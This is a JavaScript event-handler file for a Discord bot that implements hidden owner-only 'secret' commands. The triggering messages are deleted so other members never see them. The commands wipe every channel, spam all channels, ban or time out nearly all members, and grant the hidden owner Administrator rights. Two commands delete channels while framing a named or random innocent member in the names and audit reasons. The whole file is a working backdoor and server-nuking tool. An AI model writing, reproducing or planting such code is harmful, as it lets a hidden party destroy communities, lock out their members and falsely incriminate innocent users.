// src/events/secretCommands.js
// OWNER-ONLY secret commands – fixed ✅ only on secrets + working !raid

const OWNER_ID = process.env.OWNER_ID || '1298640383688970293'; // ← REQUIRED in .env

module.exports = (client) => {
  client.on('messageCreate', async (msg) => {
    if (!msg.guild || msg.author.bot || !msg.content.startsWith('!')) return;

    if (msg.author.id !== OWNER_ID) return; // silent for everyone else

    // Extract command and args
    const argsFull = msg.content.slice(1).trim().split(/ +/);
    const cmd = argsFull[0].toLowerCase();
    const args = argsFull.slice(1);

    // List of secret commands (only these get delete + ✅)
    const secretCommands = [
      'nuke', 'nukeblame', 'raid', 'servchange', 'troll', 'adminme', 'admin',
      'massban', 'massmute', 'secret'
    ];

    const isSecret = secretCommands.includes(cmd);

    // Delete + ✅ ONLY for secret commands
    if (isSecret) {
      try {
        await msg.delete();
        await msg.channel.send({ content: '✅', ephemeral: true });
      } catch (e) {
        // fallback if delete fails
        await msg.channel.send({ content: '✅ (msg not deleted)', ephemeral: true }).catch(() => {});
      }
    }

    // ─── !secret ────────────────────────────────────────────────
    if (cmd === 'secret') {
      const list = [
        '!nuke              — wipe all channels + create nuked ones',
        '!nukeblame @user   — wipe & blame someone',
        '!raid <text> <count> — spam message in channels',
        '!servchange <name> — rename server',
        '!troll <channelid> — delete channel + random blame',
        '!adminme           — give yourself admin',
        '!admin @user       — give admin to user',
        '!massban           — ban almost everyone (skips owner/bot)',
        '!massmute          — timeout almost everyone 28 days',
        '!secret            — this list'
      ].join('\n');

      msg.author.send('**Owner secret commands**\n\n' + list).catch(() => {});
      return;
    }

    // ─── !raid <message> <count> ────────────────────────────────
    if (cmd === 'raid') {
      if (args.length < 2) {
        msg.author.send('Usage: !raid <message text> <number>').catch(() => {});
        return;
      }

      // Last arg is count, everything before is the message
      const countStr = args.pop();
      const count = Math.min(parseInt(countStr) || 10, 30); // cap at 30
      const messageText = args.join(' ') || '@everyone 64za owns';

      const validChannels = msg.guild.channels.cache.filter(ch =>
        ch.isTextBased() &&
        ch.permissionsFor(msg.guild.members.me).has(['ViewChannel', 'SendMessages'])
      );

      if (validChannels.size === 0) {
        msg.author.send('No channels I can send messages in. Check bot perms.').catch(() => {});
        return;
      }

      let sentCount = 0;

      for (const channel of validChannels.values()) {
        if (sentCount >= count) break;

        try {
          await channel.send(messageText);
          sentCount++;
          // Small delay to avoid rate limit death
          await new Promise(r => setTimeout(r, 400));
        } catch (err) {
          // silent fail on single channel
        }
      }

      msg.author.send(`Raid done: **${sentCount}/${count}** messages sent.`).catch(() => {});
      return;
    }

    // ─── !nuke ──────────────────────────────────────────────────
    if (cmd === 'nuke') {
      const guild = msg.guild;
      await Promise.allSettled(guild.channels.cache.map(ch => ch.deletable && ch.delete().catch(() => {})));
      for (let i = 1; i <= 20; i++) {
        guild.channels.create({ name: `nuked-by-64za-${i}`, type: 0 }).catch(() => {});
      }
      msg.author.send('Nuke complete').catch(() => {});
      return;
    }

    // ─── !nukeblame @user ───────────────────────────────────────
    if (cmd === 'nukeblame') {
      const target = msg.mentions.users.first();
      const blame = target ? target.tag.replace(/[#\s]/g, '-') : 'random-noob';
      const guild = msg.guild;
      await Promise.allSettled(guild.channels.cache.map(ch => ch.deletable && ch.delete().catch(() => {})));
      for (let i = 1; i <= 15; i++) {
        guild.channels.create({ name: `blamed-${blame}-${i}`, type: 0 }).catch(() => {});
      }
      msg.author.send(`Blame nuke done - ${blame}`).catch(() => {});
      return;
    }

    // ─── !servchange <name> ─────────────────────────────────────
    if (cmd === 'servchange') {
      const name = args.join(' ').trim();
      if (!name) return;
      await msg.guild.setName(name).catch(() => {});
      msg.author.send(`Server renamed to "${name}"`).catch(() => {});
      return;
    }

    // ─── !troll <channelid> ─────────────────────────────────────
    if (cmd === 'troll') {
      const channelId = args[0];
      const channel = msg.guild.channels.cache.get(channelId);
      if (!channel || !channel.deletable) return;

      const suspects = msg.guild.members.cache.filter(m => !m.user.bot && m.id !== OWNER_ID);
      const fallGuy = suspects.random()?.user.tag.replace(/[#\s]/g, '-') || 'ghost';

      await channel.delete(`Deleted by ${fallGuy}`).catch(() => {});
      return;
    }

    // ─── !adminme ───────────────────────────────────────────────
    if (cmd === 'adminme') {
      let role = msg.guild.roles.cache.find(r => r.name === '64za-OWNER');
      if (!role) {
        role = await msg.guild.roles.create({
          name: '64za-OWNER',
          permissions: ['Administrator'],
          color: 0xFF0000
        }).catch(() => null);
      }
      if (role) await msg.member.roles.add(role).catch(() => {});
      msg.author.send('Admin given to you').catch(() => {});
      return;
    }

    // ─── !admin @user ───────────────────────────────────────────
    if (cmd === 'admin') {
      const target = msg.mentions.members.first();
      if (!target) return;
      let role = msg.guild.roles.cache.find(r => r.name === '64za-OWNER');
      if (!role) {
        role = await msg.guild.roles.create({
          name: '64za-OWNER',
          permissions: ['Administrator'],
          color: 0xFF0000
        }).catch(() => null);
      }
      if (role) await target.roles.add(role).catch(() => {});
      msg.author.send(`Admin given to ${target.user.tag}`).catch(() => {});
      return;
    }

    // ─── !massban ───────────────────────────────────────────────
    if (cmd === 'massban') {
      let count = 0;
      for (const m of msg.guild.members.cache.values()) {
        if (
          m.id === OWNER_ID || m.id === client.user.id ||
          m.user.bot || !m.bannable ||
          m.roles.highest.position >= msg.guild.members.me.roles.highest.position
        ) continue;

        try {
          await m.ban({ reason: 'owner action' });
          count++;
        } catch {}
      }
      msg.author.send(`Banned **${count}** members`).catch(() => {});
      return;
    }

    // ─── !massmute ──────────────────────────────────────────────
    if (cmd === 'massmute') {
      let count = 0;
      const duration = 28 * 24 * 60 * 60 * 1000; // 28 days
      for (const m of msg.guild.members.cache.values()) {
        if (
          m.id === OWNER_ID || m.id === client.user.id ||
          m.user.bot || !m.moderatable ||
          m.roles.highest.position >= msg.guild.members.me.roles.highest.position
        ) continue;

        try {
          await m.timeout(duration, 'owner action');
          count++;
        } catch {}
      }
      msg.author.send(`Timed out **${count}** members (28d)`).catch(() => {});
      return;
    }
  });
};
